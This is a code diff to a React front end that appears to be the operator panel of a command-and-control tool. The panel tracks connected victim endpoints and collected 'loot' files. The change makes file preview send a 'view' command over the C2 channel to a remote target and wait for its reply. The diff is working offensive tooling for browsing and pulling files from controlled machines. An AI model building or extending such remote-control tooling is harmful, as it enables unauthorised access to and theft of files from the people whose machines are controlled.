@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useCallback } from 'react';
+import React, { useState, useEffect, useCallback, useRef } from 'react';
 import {
   Monitor, FolderOpen,
   Clipboard, Cpu, HardDrive,
@@ -36,8 +36,6 @@ function AppInner() {
   const [previewOpen, setPreviewOpen] = useState(false);
   const [previewData, setPreviewData] = useState<PreviewData | null>(null);
   const [isPreviewLoading, setIsPreviewLoading] = useState(false);
-  const [previewZoom, setPreviewZoom] = useState(1);
-  const [copiedPath, setCopiedPath] = useState(false);
   const [lootFiles, setLootFiles] = useState<LootFile[]>([]);
   const [selectedLoot, setSelectedLoot] = useState<LootFile | null>(null);
   const [lootContent, setLootContent] = useState<string | null>(null);
@@ -135,18 +133,24 @@ function AppInner() {
     return { icon, isPreviewable };
   };
 
-  const requestPreview = async (filePath: string, _fileName: string) => {
+  // Remote preview runs through the C2 command channel: the client replies with a
+  // [JSON_PREVIEW] log entry which the polling hook feeds back into the modal
+  const previewTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const requestPreview = (filePath: string, _fileName: string) => {
     setPreviewOpen(true);
-    setPreviewData(null);
     setIsPreviewLoading(true);
-    try {
-      const result = await invoke<PreviewData>('preview_file', { path: filePath });
-      setPreviewData(result);
-    } catch (e) {
-      setPreviewData({ status: 'error', message: String(e) });
-    } finally {
+    setPreviewData(null);
+    if (!selectedClientId && !clients.length) {
       setIsPreviewLoading(false);
+      setPreviewData({ status: 'error', message: 'No endpoint connected — nothing to preview from' });
+      return;
     }
+    executeCommand(`view "${filePath}"`, true);
+    if (previewTimeoutRef.current) clearTimeout(previewTimeoutRef.current);
+    previewTimeoutRef.current = setTimeout(() => {
+      setIsPreviewLoading(false);
+      setPreviewData(prev => prev ?? { status: 'error', message: 'Target did not respond in time — it may be offline' });
+    }, 12000);
   };
 
   useEffect(() => {
@@ -169,6 +173,7 @@ function AppInner() {
     setIsProcessesLoading,
     setPreviewOpen,
     setPreviewData,
+    setIsPreviewLoading,
     parseFileList,
     appendTermLog,
     setC2ConnectionStatus,
@@ -260,7 +265,7 @@ function AppInner() {
           )}
         </div>
       </div>
-      <PreviewModal previewOpen={previewOpen} previewData={previewData} isPreviewLoading={isPreviewLoading} previewZoom={previewZoom} setPreviewZoom={setPreviewZoom} copiedPath={copiedPath} setCopiedPath={setCopiedPath} setPreviewOpen={setPreviewOpen} />
+      <PreviewModal previewOpen={previewOpen} previewData={previewData} isPreviewLoading={isPreviewLoading} setPreviewOpen={setPreviewOpen} />
     </div>
   );
 }
